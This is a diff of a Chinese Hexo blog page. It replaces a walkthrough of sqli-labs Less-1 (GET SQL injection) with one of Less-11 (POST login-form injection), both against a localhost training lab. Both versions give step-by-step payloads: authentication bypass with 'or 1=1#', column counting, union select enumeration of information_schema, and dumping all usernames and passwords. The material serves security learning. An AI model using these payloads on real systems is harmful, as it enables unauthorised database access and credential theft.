@@ -10,7 +10,7 @@
   
   <title>
     
-      sqli-labs_Less1 | Hexo
+      sqli-labs-Less11 | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -192,8 +192,8 @@
 </header>
 
     <div id="article-banner">
-  <h2>sqli-labs_Less1</h2>
-  <p class="post-date">2021-10-04</p>
+  <h2>sqli-labs-Less11</h2>
+  <p class="post-date">2021-10-13</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
   </div>
@@ -201,50 +201,57 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><p>基本掌握PHP语法后，逐步开始边学边练的过程，第一步便是SQL注入之sqli-labs，下面是less-1的相关学习内容。</p>
+    <section class="markdown-content"><p>我们正式进入Less-11的学习，前十关可以视为第一阶段，现在开始进入第二阶段POST的学习，不容松懈，行动起来吧！！</p>
 <span id="more"></span>
-<h5 id="一、查看是否有注入"><strong>一、查看是否有注入</strong></h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27; //localhost=127.0.0.1 (指本地主机)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/1.png" alt></p>
-<h5 id="二、查看数据有多少列"><strong>二、查看数据有多少列</strong></h5>
-<p>可以将源码的语句放在<strong>mysq</strong>l终端中测试，如下：</p>
-<p><img src="/2021/10/04/sqli-labs-Less1/22.png" alt></p>
-<p>直接在SQL注入则是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/3ok.png" alt></p>
-<p>可以看出，<strong>uses</strong>只有3列，当你执行对第4列及以上排序时，就会出现：</p>
-<p><img src="/2021/10/04/sqli-labs-Less1/33.png" alt></p>
-<p><strong>order by</strong> 关键字用于对结果集按照一个列或者多个列进行排序。</p>
-<p>当然，在序列超出时在SQL注入也会出错。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/4not.png" alt></p>
-<h5 id="三、查看哪些数据可以回显">三、查看哪些数据可以回显</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/%E4%B8%8D%E5%9B%9E%E6%98%BE.png" alt></p>
-<p>这时候发现不回显，此时就需要注释掉id</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=-1&#x27;union select 1,2,3--+ // 令id=-1</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/15.png" alt></p>
-<h5 id="四、查看当前数据库">四、查看当前数据库</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,schema_name from information_schema.schemata--+ // 查看第一个数据库;相当于是limit 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/a1.png" alt></p>
-<p>可以通过limit x,y 查询指定的数据库，其中x和y都表示数字，意思是查询从x开始y个数据库，起始为0.</p>
-<h5 id="五、查看所有数据库">五、查看所有数据库</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/a2.png" alt></p>
-<p>**group_concat()**函数将分组中的字符串与各种选项进行连接。</p>
-<h5 id="六、查看数据库中所有表">六、查看数据库中所有表</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/a3.png" alt></p>
-<p><strong>table_name</strong>指的是表名。</p>
-<h5 id="七、查看表中所有的列信息">七、查看表中所有的列信息</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/a4.png" alt></p>
-<p><strong>column_name(s)</strong> 数据库表中所有列的名称,<strong>column_name</strong>是一个列名称</p>
-<h5 id="八、查询账号和密码">八、查询账号和密码</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqil-labs-master/Less-1/?id=1&#x27;union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/04/sqli-labs-Less1/jieshu1.png" alt></p>
-<p>到这里意味着Less-1已经成功解开！！！</p>
-<p>group_concat(concat_ws(‘~’,username,password)) from security.users–+ 直接可以得到所有的账号和密码，并且使用’~'符号进行分割。</p>
+<h4 id="SQL注入">SQL注入</h4>
+<p>进入到第十一关的学习，我们会发现登录界面有别于前十关。</p>
+<p><img src="/2021/10/13/sqli-labs-Less11/denglu.png" alt></p>
+<p>说明现在是以POST方式于服务器交互数据，而前十关则是以GET方式从服务器上获取数据。那么这时候我们就会产生困惑，两种数据传输方式有什么差别，应用的地方又有什么不一样的点。百度总会告诉我们答案。</p>
+<p><img src="/2021/10/13/sqli-labs-Less11/201981916595380107.jpg" alt></p>
+<p>通过可见性，我们知道post传送不能在url上看到数据，只能通过抓包工具进行查看。并且像登陆框这种模式也是可以当成sql语句注入的。</p>
+<p>这时候我们可以随便输入账号密码，submit之后出现错误，可以看到查询username和password用and连接放在同一个SQL语句中。使用BurpSuite抓包工具</p>
+<p><img src="/2021/10/13/sqli-labs-Less11/burp1.png" alt></p>
+<p>我们可以看到Raw中有POST路径、本地地址、浏览器地址、语言等信息</p>
+<p>这时候我们复制最底下的数据，在火狐上用Hackbar插件打开，在Post data上复制，并开始展开分析</p>
+<p>我们使用万能语句 or 1=1，添加单双引号、括号来猜测SQL的注入方式，最后发现输入单引号是正确的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27;or 1=1#&amp;submit=Submit //此处不能使用--+，需要使用#，--+是在url中使用,#符号是注释后面的sql语句</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E4%B8%87%E8%83%BD.png" alt></p>
+<h4 id="查看数据列数">查看数据列数</h4>
+<p>下一步就开始查列数了，我们在这里先试试看有没有三列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;order by 3#$passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/order3.png" alt></p>
+<p>这里可以看到蓝色字体显示Unknown column ‘3’ in ‘order clause’，说明数据库列数没有3列，接着我们减一再试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;order by 2#$passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/order2.png" alt></p>
+<p>虽然这里显示登陆失败，不过这是正常情况，不必在意，并且蓝色的语句不见了，说明列数正是2列。</p>
+<h4 id="组合查询">组合查询</h4>
+<p>查询哪些信息可以回显。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,2#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E7%BB%84%E5%90%88%E6%9F%A5%E8%AF%A2.png" alt></p>
+<p>回显位置1，2非常明确，循规蹈矩，接下来是查库。</p>
+<h4 id="查库">查库</h4>
+<p><strong>第一种方法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,database()#&amp;passwd=admin&amp;submit=Submit // 查询当前使用的数据库</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E6%9F%A5%E5%BA%931.png" alt></p>
+<p><strong>第二种方法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,schema_name from information_schema.schemata limit 1,1#&amp;passwd=admin&amp;submit=Submit // 查询任意位置的数据库，借用limit x,y</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E6%9F%A5%E5%BA%932.png" alt></p>
+<p><strong>第三种方法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=admin&amp;submit=Submit // 查询所有数据库</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E6%9F%A5%E5%BA%933.png" alt></p>
+<h4 id="查表">查表</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E6%9F%A5%E8%A1%A8.png" alt></p>
+<p>得到表的数据有：emails，referers，uagents，users</p>
+<h4 id="查列">查列</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E6%9F%A5.png" alt></p>
+<h4 id="查询账号密码">查询账号密码</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27;union select 1,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users#&amp;passwd=admin&amp;submit=Submit // concat_ws可以得到所有账户密码并一一对应</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/13/sqli-labs-Less11/%E5%AF%86%E7%A0%81.png" alt></p>
+<p>到这里，我们就完整的解出了Less-11的所有内容。</p>
+<h4 id="总结">总结</h4>
+<p>对Less-11完整的学习后，我们会有一种熟悉的感觉，没错，这不正和Less-1有着异曲同工之处嘛，区别就是Less-1是GET方式，Less-11则是POST方式，在查询方法上，两者则是相同的。</p>
 </section>
     <!-- Tags START -->
     
@@ -254,20 +261,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2021/09/29/linux-ubuntu-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">
+      <a class="nav-left" href="/2021/10/12/sqli-labs-Less8-10/">
         <span class="nav-arrow">← </span>
         
-          linux ubuntu 基础命令
+          sqli-labs-Less8~10
         
       </a>
     
-    
-      <a class="nav-right" href="/2021/10/06/sqli-labs-Less2-5/">
-        
-          sqli-labs-Less2~5
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -319,7 +319,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%B8%80%E3%80%81%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5"><span class="toc-nav-text">一、查看是否有注入</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BA%8C%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E6%9C%89%E5%A4%9A%E5%B0%91%E5%88%97"><span class="toc-nav-text">二、查看数据有多少列</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%B8%89%E3%80%81%E6%9F%A5%E7%9C%8B%E5%93%AA%E4%BA%9B%E6%95%B0%E6%8D%AE%E5%8F%AF%E4%BB%A5%E5%9B%9E%E6%98%BE"><span class="toc-nav-text">三、查看哪些数据可以回显</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%9B%9B%E3%80%81%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-nav-text">四、查看当前数据库</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BA%94%E3%80%81%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-nav-text">五、查看所有数据库</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%85%AD%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-nav-text">六、查看数据库中所有表</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%B8%83%E3%80%81%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%88%97%E4%BF%A1%E6%81%AF"><span class="toc-nav-text">七、查看表中所有的列信息</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%85%AB%E3%80%81%E6%9F%A5%E8%AF%A2%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-nav-text">八、查询账号和密码</span></a></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%88%97%E6%95%B0"><span class="toc-nav-text">查看数据列数</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%84%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-nav-text">组合查询</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9F%A5%E5%BA%93"><span class="toc-nav-text">查库</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9F%A5%E8%A1%A8"><span class="toc-nav-text">查表</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9F%A5%E5%88%97"><span class="toc-nav-text">查列</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-nav-text">查询账号密码</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-text">总结</span></a></li></ol>
     
   </div>
 </aside>
@@ -329,7 +329,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/2021/10/04/sqli-labs-Less1/';
+    var url = 'http://example.com/2021/10/13/sqli-labs-Less11/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
